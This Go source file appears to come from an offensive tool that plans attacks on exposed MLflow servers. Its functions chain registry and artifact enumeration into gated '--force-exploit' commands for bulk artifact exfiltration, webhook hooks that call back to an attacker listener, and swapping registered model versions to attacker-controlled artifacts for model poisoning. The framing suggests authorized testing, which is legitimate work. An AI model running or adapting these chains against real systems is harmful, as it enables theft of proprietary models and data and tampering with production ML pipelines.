package main

func buildMLflowEnumWorkflowPlan(target string, experiments []string, runIDs []string) workflowPlan {
	target = canonicalServiceURL(target)
	experiment := shellSafeArg(firstOrPlaceholder(experiments, "<experiment-id>"))
	runID := shellSafeArg(firstOrPlaceholder(runIDs, "<run-id>"))
	return workflowPlan{
		Target:      target,
		Stage:       "enum",
		Landed:      "reachable",
		ChainSource: "mlflow-enum",
		Rationale:   "MLflow tracking surfaces should flow into experiments, runs, registry, and bounded artifact reads.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" experiments --experiment "+experiment+" --limit 5"), "Inspect a discovered experiment and its visible runs.", false, 10),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" runs --experiment "+experiment+" --limit 5"), "Enumerate concrete run IDs with bounded metadata summaries.", false, 20),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" registry"), "Check whether the model registry API is exposed.", false, 30),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" model-versions --model <registered-model>"), "Enumerate model versions and source URIs once a registry model is known.", false, 40),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" artifacts --run-id "+runID), "List bounded artifact paths for a discovered run.", false, 50),
		},
	}
}

func buildMLflowExperimentWorkflowPlan(target, experiment string) workflowPlan {
	target = canonicalServiceURL(target)
	experiment = shellSafeArg(firstOrPlaceholder([]string{experiment}, "<experiment-id>"))
	return workflowPlan{
		Target:    target,
		Stage:     "experiment",
		Rationale: "A discovered experiment can be queried directly for visible runs before artifact reads.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" runs --experiment "+experiment+" --limit 5"), "List runs for this specific experiment.", false, 10),
		},
	}
}

func buildMLflowRunWorkflowPlan(target, runID, artifactPath string) workflowPlan {
	target = canonicalServiceURL(target)
	runID = shellSafeArg(firstOrPlaceholder([]string{runID}, "<run-id>"))
	artifactPath = shellSafeArg(firstOrPlaceholder([]string{artifactPath}, "<artifact-path>"))
	return workflowPlan{
		Target:      target,
		Stage:       "correlation",
		Landed:      "reachable",
		ChainSource: "mlflow-runs",
		Rationale:   "A discovered MLflow run ID can drive bounded artifact retrieval without more guessing.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" artifacts --run-id "+runID), "List concrete artifact paths for this run.", false, 10),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" download-artifact --run-id "+runID+" --artifact-path "+artifactPath), "Read a bounded artifact path for this run.", false, 20),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" bulk-download --run-id "+runID+" --path-prefix "+artifactPath+" --force-exploit"), "Recursively download capped artifacts once bulk exfiltration is in scope.", true, 30),
		},
	}
}

func buildMLflowRegistryWorkflowPlan(target, model string) workflowPlan {
	target = canonicalServiceURL(target)
	model = shellSafeArg(firstOrPlaceholder([]string{model}, "<registered-model>"))
	return workflowPlan{
		Target:      target,
		Stage:       "correlation",
		Landed:      "reachable",
		ChainSource: "mlflow-registry",
		Rationale:   "Exposed model registry metadata can help prioritize artifact and run inspection.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" registry"), "Review registered models and versions again with the current endpoint.", false, 10),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" model-versions --model "+model), "Enumerate versions, stages, and source URIs for this model.", false, 20),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" experiments --limit 5"), "Correlate registry data with visible experiments and runs.", false, 30),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" runs --experiment <experiment-id> --limit 5"), "Use a visible experiment to locate runs connected to "+model+".", false, 40),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" hook --model "+model+" --version <version> --callback-url http://<your-listener>:8443/webhook --force-exploit"), "If MLOps hook automation is in scope, install a model-version hook tag and confirm downstream delivery.", true, 50),
		},
	}
}

func buildMLflowArtifactWorkflowPlan(target, runID, artifactPath string, isDir ...bool) workflowPlan {
	target = canonicalServiceURL(target)
	runID = shellSafeArg(firstOrPlaceholder([]string{runID}, "<run-id>"))
	artifactPath = shellSafeArg(firstOrPlaceholder([]string{artifactPath}, "<artifact-path>"))

	dir := len(isDir) > 0 && isDir[0]
	var rec workflowRecommendation
	if dir {
		rec = newWorkflowRecommendation(
			formatCommandExample("mlflow --target "+target+" artifacts --run-id "+runID+" --path-prefix "+artifactPath),
			"List contents of this artifact directory.", false, 10)
	} else {
		rec = newWorkflowRecommendation(
			formatCommandExample("mlflow --target "+target+" download-artifact --run-id "+runID+" --artifact-path "+artifactPath),
			"Read this exact artifact path.", false, 10)
	}
	return workflowPlan{
		Target:          target,
		Stage:           "proof",
		Landed:          "read-confirmed",
		ChainSource:     "mlflow-artifacts",
		Rationale:       "A listed artifact path makes bounded download commands concrete and copyable.",
		Recommendations: []workflowRecommendation{rec},
	}
}

func buildMLflowBulkDownloadWorkflowPlan(target, runID, model, version, artifactPath string) workflowPlan {
	target = canonicalServiceURL(target)
	runID = shellSafeArg(firstOrPlaceholder([]string{runID}, "<run-id>"))
	artifactPath = shellSafeArg(firstOrPlaceholder([]string{artifactPath}, "<artifact-path>"))
	model = shellSafeArg(firstOrPlaceholder([]string{model}, "<registered-model>"))

	recs := []workflowRecommendation{
		newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" download-artifact --run-id "+runID+" --artifact-path "+artifactPath), "Re-read a specific downloaded artifact path with a bounded preview.", false, 10),
		newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" registry"), "Correlate downloaded model material with the exposed registry.", false, 20),
		newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" model-versions --model "+model), "Review model versions tied to the downloaded artifact material.", false, 30),
	}
	if model != "<registered-model>" {
		recs = append(recs, newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" swap-model --model "+model+" --source <your-artifact-uri> --force-exploit"), "If registry mutation is in scope, create a new model version pointing to controlled artifact material.", true, 40))
	}
	return workflowPlan{
		Target:          target,
		Stage:           "impact",
		Landed:          "read-confirmed",
		ChainSource:     "mlflow-bulk-download",
		Rationale:       "Bulk artifacts were downloaded; correlate material to registry versions before any gated registry mutation.",
		Recommendations: recs,
	}
}

func buildMLflowDownloadArtifactSummaryWorkflowPlan(target, runID, artifactPath string) workflowPlan {
	target = canonicalServiceURL(target)
	_ = firstOrPlaceholder([]string{runID}, "<run-id>")
	return workflowPlan{
		Target:      target,
		Stage:       "proof",
		Landed:      "read-confirmed",
		ChainSource: "mlflow-download-artifact",
		Rationale:   "Artifact downloaded; correlate back to runs and experiments for additional context.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" runs --experiment <experiment-id> --limit 5"), "Correlate this artifact's run back to visible experiments.", false, 10),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" registry"), "Check whether the registry exposes models tied to this run.", false, 20),
		},
	}
}

// buildMLflowUploadArtifactWorkflowPlan chains a confirmed artifact-store write into
// registry correlation so the operator can identify a served model whose artifacts
// reference the store. Read-only follow-ons only (no gated placeholder command).
func buildMLflowUploadArtifactWorkflowPlan(target, artifactPath, stage, landed string) workflowPlan {
	target = canonicalServiceURL(target)
	return workflowPlan{
		Target:      target,
		Stage:       stage,
		Landed:      landed,
		ChainSource: "mlflow-upload-artifact",
		Rationale:   "A write to the MLflow artifact store at " + artifactPath + " landed; enumerate the registry to correlate a served model whose artifacts reference this store.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" registry"), "Enumerate registered models to identify one whose artifact source references the store you wrote to.", false, 10),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" model-versions --model <a-registered-model>"), "Once `registry` names one, inspect its versions and artifact source to target poisoning.", false, 20),
		},
	}
}

func buildMLflowRegistrySummaryWorkflowPlan(target, model string) workflowPlan {
	target = canonicalServiceURL(target)
	model = shellSafeArg(firstOrPlaceholder([]string{model}, "<registered-model>"))
	return workflowPlan{
		Target:      target,
		Stage:       "registry",
		Landed:      "reachable",
		ChainSource: "mlflow-registry",
		Rationale:   "Registry listing complete; drill into model versions and correlate with experiments.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" model-versions --model "+model), "Enumerate versions, stages, and source URIs for this model.", false, 10),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" experiments --limit 5"), "Correlate registry data with visible experiments and runs.", false, 20),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" runs --experiment <experiment-id> --limit 5"), "Use a visible experiment to locate runs connected to "+model+".", false, 30),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" hook --model "+model+" --version <version> --callback-url http://<your-listener>:8443/webhook --force-exploit"), "If hook automation is in scope, install a model-version hook tag and watch for downstream delivery.", true, 40),
		},
	}
}

func buildMLflowModelArtifactsSummaryWorkflowPlan(target, model, version, runID, artifactPath string) workflowPlan {
	target = canonicalServiceURL(target)
	_ = firstOrPlaceholder([]string{model}, "<registered-model>")
	_ = firstOrPlaceholder([]string{version}, "<version>")
	runID = shellSafeArg(firstOrPlaceholder([]string{runID}, "<run-id>"))
	artifactPath = shellSafeArg(firstOrPlaceholder([]string{artifactPath}, "<artifact-path>"))
	return workflowPlan{
		Target:      target,
		Stage:       "proof",
		Landed:      "read-confirmed",
		ChainSource: "mlflow-model-artifacts",
		Rationale:   "Model artifact listing complete; download concrete paths from the model version's backing run for inspection.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" download-artifact --run-id "+runID+" --artifact-path "+artifactPath), "Read this concrete model artifact path from the model version's backing run.", false, 10),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" bulk-download --model "+shellSafeArg(firstOrPlaceholder([]string{model}, "<registered-model>"))+" --version "+shellSafeArg(firstOrPlaceholder([]string{version}, "<version>"))+" --force-exploit"), "Recursively download capped artifacts from this model version once bulk exfiltration is in scope.", true, 20),
		},
	}
}

func buildMLflowModelVersionWorkflowPlan(target, model, version string) workflowPlan {
	target = canonicalServiceURL(target)
	model = shellSafeArg(firstOrPlaceholder([]string{model}, "<registered-model>"))
	version = shellSafeArg(firstOrPlaceholder([]string{version}, "<version>"))
	return workflowPlan{
		Target:      target,
		Stage:       "correlation",
		Landed:      "reachable",
		ChainSource: "mlflow-model-versions",
		Rationale:   "Discovered model versions can be pivoted into run correlation and bounded model-artifact reads.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" model-artifacts --model "+model+" --version "+version), "Use a concrete model/version pair for bounded model-artifact reads.", false, 10),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" runs --experiment <experiment-id> --limit 5"), "Correlate the model version back to visible runs.", false, 20),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" hook --model "+model+" --version "+version+" --callback-url http://<your-listener>:8443/webhook --force-exploit"), "Install a hook tag on this concrete model version and confirm whether downstream automation consumes it.", true, 30),
		},
	}
}

func buildMLflowHookWorkflowPlan(target, model, version string, landedContext ...string) workflowPlan {
	target = canonicalServiceURL(target)
	model = shellSafeArg(firstOrPlaceholder([]string{model}, "<registered-model>"))
	version = shellSafeArg(firstOrPlaceholder([]string{version}, "<version>"))
	stage := "impact"
	landed := "influenced"
	if len(landedContext) >= 2 {
		stage = landedContext[0]
		landed = landedContext[1]
	}
	return workflowPlan{
		Target:      target,
		Stage:       stage,
		Landed:      landed,
		ChainSource: "mlflow-hook",
		Rationale:   "Hook metadata is installed; verify the registry state and continue artifact/serving correlation without claiming MLflow host code execution.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" model-versions --model "+model), "Verify the hook tag remains visible on the model version.", false, 10),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" model-artifacts --model "+model+" --version "+version), "Correlate the hooked version back to the artifact material it would govern.", false, 20),
			newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" registry"), "Review the rest of the registry for additional hookable versions.", false, 30),
		},
	}
}
